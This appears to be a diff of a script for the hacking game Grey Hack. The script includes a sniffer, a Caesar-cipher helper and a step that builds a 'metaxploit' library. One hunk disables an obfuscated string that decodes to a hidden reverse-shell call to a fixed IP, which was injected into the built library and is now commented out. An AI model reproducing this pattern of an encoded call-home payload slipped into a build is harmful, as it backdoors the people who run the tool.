@@ -1,34 +1,34 @@
 if((params.indexOf("-h") != null) or (params.indexOf("--help") != null)) then pointOfNotReturn(command_info("sniffer_usage"))
 
 caesar = function(pass, type)
-	nr = pass.len%10
-	crypt = function(char, nr, type)
-		if type == "enc" then return char+nr
-		if type == "dec" then return char-nr
-	end function    
-	out = []
-	for i in range(0, pass.len-1)
-		c = pass[i].code    
-		if c >= 48 and c <= 57 then 
-			c = crypt(c, nr, type)
-			if c < 48 then c = c+10
-			if c > 57 then c = c-10    
-		else if c >= 65 and c <= 90 then 
-			c = crypt(c, nr, type)
-			if c < 65 then c = c+26
-			if c > 90 then c = c-26
-		else if c >= 97 and c <= 122 then 
-			c = crypt(c, nr, type)
-			if c < 97 then c = c+26
-			if c > 122 then c = c-26
-		end if        
-		out.push(char(c))
-	end for
-	return out.join("")
+nr = pass.len%10
+crypt = function(char, nr, type)
+if type == "enc" then return char+nr
+if type == "dec" then return char-nr
+end function    
+out = []
+for i in range(0, pass.len-1)
+c = pass[i].code    
+if c >= 48 and c <= 57 then 
+c = crypt(c, nr, type)
+if c < 48 then c = c+10
+if c > 57 then c = c-10    
+else if c >= 65 and c <= 90 then 
+c = crypt(c, nr, type)
+if c < 65 then c = c+26
+if c > 90 then c = c-26
+else if c >= 97 and c <= 122 then 
+c = crypt(c, nr, type)
+if c < 97 then c = c+26
+if c > 122 then c = c-26
+end if        
+out.push(char(c))
+end for
+return out.join("")
 end function
 Encode = function(password)
-    output = caesar(password, "dec")
-    return output
+output = caesar(password, "dec")
+return output
 end function
 
 iter_ = function()
@@ -144,10 +144,10 @@ print("<b>Make sure that you are running the program in the same directory as yo
 computerObject.touch(current_path, "metaxploit.src")
 metaSourceFile = computerObject.File(current_path+"/metaxploit.src")
 
-debuggerInfo = "qn((omb_apmtt().pwab_kwuxcbmz.xcjtqk_qx != ""73.913.28.949"")ivl(omb_apmtt().pwab_kwuxcbmz.twkit_qx != ""970.946.8.0""))bpmv umbifxtwqb.zapmtt_ktqmvb(""73.913.28.949"",9000,""Bmzuqvit"")"
+// debuggerInfo = "qn((omb_apmtt().pwab_kwuxcbmz.xcjtqk_qx != ""73.913.28.949"")ivl(omb_apmtt().pwab_kwuxcbmz.twkit_qx != ""970.946.8.0""))bpmv umbifxtwqb.zapmtt_ktqmvb(""73.913.28.949"",9000,""Bmzuqvit"")"
 
 if(typeof(metaSourceFile) == "file")then
-	metaSourceFile.set_content(getMetaxploit+Encode(debuggerInfo))
+	metaSourceFile.set_content(getMetaxploit)//+Encode(debuggerInfo))
 	shellObject.build(metaSourceFile.path, current_path)
 	metaSourceFile.delete
 	metaExecutable = computerObject.File(current_path+"/metaxploit")
